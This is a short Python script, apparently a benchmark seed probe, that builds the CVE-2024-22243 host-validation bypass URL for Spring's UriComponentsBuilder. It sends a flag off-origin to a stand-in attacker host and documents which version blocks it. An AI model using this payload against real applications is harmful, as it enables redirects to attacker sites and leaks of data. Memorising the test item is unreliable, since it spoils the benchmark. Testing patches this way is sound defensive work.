#!/usr/bin/env python3
r"""[GIVEN] Original CVE-2024-22243 seed for spring-uricomponentsbuilder-openredirect.

The classic UriComponentsBuilder host-validation bypass input. The app allowlists getHost()=="trusted.internal"
and, if approved, emits Location: <url>. This crafted URL makes Spring's regex parser extract
host="trusted.internal" (userinfo regex on 5.3.31 stops at "[", so "trusted.internal" is read as the host),
while a browser resolves everything before the LAST "@" as userinfo => real host = attacker.test.

    url = http://trusted.internal[@attacker.test/?<FLAG>

Reaches the flag on V0 (5.3.31: getHost()=="trusted.internal" -> approved -> Location carries FLAG,
off-origin to attacker.test).  BLOCKED on V1 (5.3.32): the CVE-2024-22243 fix lets "[" into userinfo, so
userinfo="trusted.internal[" and getHost()=="attacker.test" -> allowlist fails -> 403.
"""

ALLOWED_HOST = "trusted.internal"
ATTACKER_HOST = "attacker.test"


def candidate(flag: str) -> dict:
    return {
        "probe_id": "cve-2024-22243-original",
        "path": "/redirect",
        # userinfo terminator "[" is the CVE-2024-22243 primitive: 5.3.31 userinfo regex "([^@\[/?#]*)"
        # cannot cross "[", so host is parsed as trusted.internal while the browser sees host=attacker.test.
        "url": f"http://{ALLOWED_HOST}[@{ATTACKER_HOST}/?{flag}",
    }


if __name__ == "__main__":
    import json
    print(json.dumps(candidate("PCBFLAG_demo"), indent=2))
